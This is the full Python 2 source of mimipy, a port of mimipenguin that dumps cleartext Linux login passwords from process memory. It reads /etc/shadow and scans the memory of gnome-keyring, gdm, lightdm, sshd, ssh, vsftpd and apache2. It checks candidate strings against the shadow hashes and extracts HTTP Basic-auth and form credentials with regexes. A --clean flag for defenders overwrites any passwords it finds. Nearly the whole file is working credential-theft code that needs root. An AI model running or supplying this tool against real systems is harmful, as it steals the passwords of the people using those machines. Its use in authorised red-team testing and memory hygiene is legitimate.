#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
# mimipy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms


"""
    Author: Nicolas VERDIER (contact@n1nj4.eu)
    Original idea from @huntergregal (https://github.com/huntergregal/mimipenguin)
    This is a port in python of @huntergregal's bash script mimipenguin.sh with some improvments :
        - possibility to clean passwords found from memory
        - possibility to search for any trace of your password in all your processes
        - possibility to scan a process by pid
        - add some additional processes to scan like lightDM
    You can find the bleeding edge version of mimipy here : https://github.com/n1nj4sec/mimipy

"""
import sys, os
import urllib2
import crypt
import re
import argparse
import logging
import time
import random
import traceback
import base64

class VersionError(Exception):
    pass

try:
    from memorpy import *
    try:
        from memorpy.version import version as memorpy_version
    except:
        memorpy_version=(0,0)
    if memorpy_version<(1,5):
        logging.warning("memorpy version is too old, please update !")
        raise VersionError("memorpy version is too old, please update !")
        
except ImportError as e:
    logging.warning("%s\ninstall with: \"pip install https://github.com/n1nj4sec/memorpy/archive/master.zip\""%e)
    raise e

LOOK_AFTER_SIZE=1000*10**3
LOOK_BEFORE_SIZE=500*10**3




def colorize(s, color="grey"):
    if s is None:
        return ""
    s=str(s)
    res=s
    COLOR_STOP="\033[0m"
    if color.lower()=="random":
        color=random.choice(["blue","red","green","yellow"])
    if color.lower()=="blue":
        res="\033[34m"+s+COLOR_STOP
    if color.lower()=="red":
        res="\033[31m"+s+COLOR_STOP
    if color.lower()=="green":
        res="\033[32m"+s+COLOR_STOP
    if color.lower()=="yellow":
        res="\033[33m"+s+COLOR_STOP
    if color.lower()=="grey":
        res="\033[37m"+s+COLOR_STOP
    if color.lower()=="darkgrey":
        res="\033[1;30m"+s+COLOR_STOP
    return res


def get_shadow_hashes():
    hashes=[]
    with open('/etc/shadow', 'rb') as f:
        for line in f:
            tab=line.split(":")
            if len(tab[1])>10:
                hashes.append((tab[0],tab[1]))
    return hashes


def memstrings(mw, start_offset=None, end_offset=None, optimizations=''):
    for _,x in mw.mem_search(r"([\x20-\x7e]{6,50})[^\x20-\x7e]", ftype='re', start_offset=start_offset, end_offset=end_offset, optimizations=optimizations):
        yield x



passwords_found=set()
def password_found(desc, process, user, password):
    global passwords_found
    if (process, user, password) not in passwords_found:
        passwords_found.add((process, user, password))
        print colorize("%s : "%desc, color="green")
        print colorize("\t- Process\t: %s"%process, color="grey")
        print colorize("\t- Username\t: %s"%user, color="grey")
        print colorize("\t- Password\t: %s"%password, color="grey")


def password_list_match(password_list, near):
    for passwd in password_list:
        if near.search(passwd):
            return True
    return False

def cleanup_string(s):
    ns=""
    for c in s:
        if ord(c)<0x20 or ord(c)>0x7e:
            break
        ns+=c
    return ns

def get_strings_around(mw, addr, string_at_addr, max_strings=30):
    strings_list=[]
    logging.debug("looking for strings around %s from %s to %s"%(hex(addr), int(addr-LOOK_BEFORE_SIZE), int(addr-LOOK_AFTER_SIZE)))
    for o in memstrings(mw, start_offset=int(addr-LOOK_BEFORE_SIZE), end_offset=int(addr+LOOK_AFTER_SIZE)):
        s=cleanup_string(o.read(type='string', maxlen=51, errors='ignore'))
        strings_list.append(s)
        if len(strings_list)>=30 and string_at_addr in strings_list[max_strings/2]:
            break
        elif len(strings_list)>30:
            strings_list=strings_list[1:]
    return strings_list

def search_password(optimizations='nsrx'):
    import getpass
    mypasswd=getpass.getpass("search your password: ")
    for procdic in Process.list():
        name=procdic["name"]
        pid=int(procdic["pid"])
        if pid==os.getpid():
            continue
        if "gnome-terminal-server" in name:
            continue #avoid false positives when password has been printed to screen by this script x)
        logging.info("Searching pass in %s (%s)"%(name, pid))
        try:
            with MemWorker(pid=pid) as mw:
                #for _,x in mw.mem_search(r"\$[0-9][a-z]?\$(?:[a-zA-Z0-9\./\-\+]{4,}\$)?[a-zA-Z0-9\./\-\+]{20,}", ftype='re'):
                #    h=x.read(type='string', maxlen=300)
                #    print "hash found in %s (%s) : %s"%(name, pid, h)
                #    strings_list=get_strings_around(mw, x, h)
                #    print "strings found around : %s"%strings_list
                #    if not strings_list:
                #        x.dump(before=200, size=400)
                for x in mw.mem_search(mypasswd, optimizations=optimizations):
                    print colorize("[+] password found in process %s (%s) : %s !"%(name, pid, x), color="green")
                    x.dump(before=1000, size=2000)
                    print "strings found around : "
                    strings_list=get_strings_around(mw, x, mypasswd)
                    print "strings found around : %s"%strings_list
                    #print "strings where the password's address is referenced :"
                    #for _,o in mw.search_address(x):
                    #    o.dump(before=200, size=400)
                    #print "done"

        except Exception as e:
            logging.error("Error scanning process %s (%s): %s"%(name, pid, e))
            logging.debug(traceback.format_exc())

def group_search(name, pid, rule, clean=False, cred_cb=None, optimizations='nsrx'):
    logging.info("Analysing process %s (%s) for passwords ..."%(name, pid))
    with MemWorker(name=name, pid=pid) as mw:
        for service, x in mw.mem_search(rule["groups"], ftype='ngroups', optimizations=optimizations):
            user=""
            password=""
            if "basic" in x:
                try:
                    user, password=base64.b64decode(x["basic"]).split(":",1)
                except:
                    pass
            elif "Login" in x and "Password" in x:
                user=x["Login"]
                password=x["Password"]
            else:
                password=str(x)
                
            yield (rule["desc"]+" "+service, user, password)


def test_shadow(name, pid, rule, clean=False, cred_cb=None, optimizations='nsrx'):
    logging.info("Analysing process %s (%s) for shadow passwords ..."%(name, pid))
    password_tested=set() #to avoid hashing the same string multiple times
    with MemWorker(name=name, pid=pid) as mw:
        scanned_segments=[]
        for _,match_addr in mw.mem_search(rule["near"], ftype='re', optimizations=optimizations):
            password_list=[]
            total=0
            start=int(match_addr-LOOK_AFTER_SIZE)
            end=int(match_addr+LOOK_AFTER_SIZE)
            for s,e in scanned_segments:
                if end < s or start > e:
                    continue #no collision
                elif start >=s and e >= start and end >= e:
                    logging.debug("%s-%s reduced to %s-%s"%(hex(start), hex(end), hex(e), hex(end)))
                    start=e-200 #we only scan a smaller region because some of it has already been scanned
            logging.debug("looking between offsets %s-%s"%(hex(start),hex(end)))
            scanned_segments.append((start, end))
            for x in memstrings(mw, start_offset=start, end_offset=end, optimizations=optimizations):
                passwd=cleanup_string(x.read(type='string', maxlen=51, errors='ignore'))
                total+=1
                password_list.append(passwd)
                if len(password_list)>40:
                    password_list=password_list[1:]
                if password_list_match(password_list, rule["near"]):
                    for p in password_list:
                        if p not in password_tested:
                            password_tested.add(p)
                            for user, h in shadow_hashes:
                                if crypt.crypt(p, h) == h:
                                    yield (rule["desc"], user, p)
                                    if clean:
                                        logging.info("cleaning password from memory in proc %s at offset: %s ..."%(name, hex(x)))
                                        x.write("x"*len(p))
shadow_hashes=[]
def mimipy_loot_passwords(clean=False, optimizations='nsrx'):
    global shadow_hashes
    shadow_hashes=get_shadow_hashes()
    for procdic in Process.list():
        name=procdic["name"]
        pid=int(procdic["pid"])
        for rule in rules:
            if re.search(rule["process"], name):
                start_time=time.time()
                try:
                    for t, u, p in rule["func"](name, pid, rule, clean=clean, optimizations=optimizations):
                        yield (t, name, u, p)
                except Exception as e:
                    logging.warning("[-] %s"%e)
                    logging.debug(traceback.format_exc())
                finally:
                    logging.info("Process %s analysed in %s seconds"%(name, time.time()-start_time))

HTTP_AUTH_REGEX = [
    ("Basic", re.compile(r"(?:WWW-|Proxy-)?Authorization:\s+Basic\s+(?P<basic>[a-zA-Z0-9/\+]+={0,3})", re.IGNORECASE)), #TODO: digest, ntlm, ... hashes are still nice
    ("GET/POST", re.compile(r"(:?e?mail(?:_?adress)?|log(?:in)?|user(?:name)?|session_key|user%5Bemail%5D)=(?P<Login>[a-zA-Z0-9%_+*.:-]{0,25})&.{0,10}?(?:[a-z]{1,10}_|user)?(?:pa?s?s?w?o?r?d?|mdp|%5Bpassword%5D)=(?P<Password>[a-zA-Z0-9%_+*.:-]{0,25})"), re.IGNORECASE)
]

rules = [
    {
        "desc" : "[SYSTEM - GNOME]",
        "process" : r"gnome-keyring-daemon|gdm-password|gdm-session-worker",
        "near" : r"libgcrypt\.so\..+|libgck\-1\.so\.0|_pammodutil_getpwnam_|gkr_system_authtok",
		"func" : test_shadow,
    },
    {
        "desc" : "[SYSTEM - LightDM]", # Ubuntu/xubuntu login screen :) https://doc.ubuntu-fr.org/lightdm
        "process" : r"lightdm",
        "near" : r"_pammodutil_getpwnam_|gkr_system_authtok",
		"func" : test_shadow,
    },
    {
        "desc" : "[SYSTEM - SSH Server]",
        "process" : r"/sshd$",
        "near" : r"sudo.+|_pammodutil_getpwnam_",
		"func" : test_shadow,
    },
    {
        "desc" : "[SSH Client]",
        "process" : r"/ssh$",
        "near" : r"sudo.+|/tmp/ICE-unix/[0-9]+",
		"func" : test_shadow,
    },
    {
        "desc" : "[SYSTEM - VSFTPD]",
        "process" : r"vsftpd",
        "near" : r"^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$",
		"func" : test_shadow,
    },
    {
        "desc" : "[HTTP]",
        "process" : r"/apache2",
		"func" : group_search,
        "groups" : HTTP_AUTH_REGEX,
    },
#    {
#        "desc" : "[Browser]",
#        "process" : r"firefox|iceweasel|chromium|chrome",
#		"func" : group_search,
#        "groups" : HTTP_AUTH_REGEX,
#    },
]

REGEX_TYPE=type(re.compile("^plop$"))
#precompile regexes to optimize speed
for x in rules:
    if "near" in x:
        if type(x["near"])!=REGEX_TYPE:
            x["near"]=re.compile(x["near"])
    if "process" in x:
        if type(x["process"])!=REGEX_TYPE:
            x["process"]=re.compile(x["process"])

if __name__=="__main__":
    parser = argparse.ArgumentParser(description="""
    mimipy can loot passwords from memory or overwrite them to mitigate mimipenguin\'s dumps !

    Author: Nicolas VERDIER (contact@n1nj4.eu)
    orginal mimipenguin.sh script and idea from @huntergregal
    Bleeding Edge version: https://github.com/n1nj4sec/mimipy
    
    """, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('--clean', action='store_true', help='@blueteams protect yourself and clean found passwords from memory ! You might want to regularly run this on your workstation/servers')
    parser.add_argument('-v', '--verbose', action='store_true', help='be more verbose !')
    parser.add_argument('-n', '--no-optimize', action='store_true', help='disable optimisations (search the whole memory whatever region perms are) (slower)')
    parser.add_argument('-p', '--pid', type=int, help='choose the process\'s pid to scan instead of automatic selection')
    parser.add_argument('--search-password', action='store_true', help='prompt for your password and search it in all your processes !.')
    args = parser.parse_args()

    #logging.basicConfig(filename='example.log', level=logging.DEBUG)
    if args.verbose:
        logging.basicConfig(stream=sys.stderr, level=logging.INFO)
    else:
        logging.basicConfig(stream=sys.stderr, level=logging.WARNING)

    total_time=time.time()

    if os.geteuid()!=0:
        logging.error("mimipy needs root ;)")
        exit(1)

    opt="nsrx"
    if args.no_optimize:
        logging.info("Optimizations disabled")
        opt=''

    if args.search_password:
        search_password(optimizations=opt)
        exit(0)

    if args.pid:
        for procdic in Process.list():
            name=procdic["name"]
            pid=int(procdic["pid"])
            if pid==args.pid:
                try:
                    start_time=time.time()
                    for rule in rules:
                        rule["func"](name, pid, rule, clean=args.clean, optimizations=opt)
                except Exception as e:
                    logging.warning("[-] %s"%e)
                finally:
                    logging.info("Process %s analysed in %s seconds"%(name, time.time()-start_time))
    else:
        for t, process, u, passwd in mimipy_loot_passwords(optimizations=opt, clean=args.clean):
            password_found(t, process, u, passwd)
    logging.info("Script executed in %s seconds"%(time.time()-total_time))



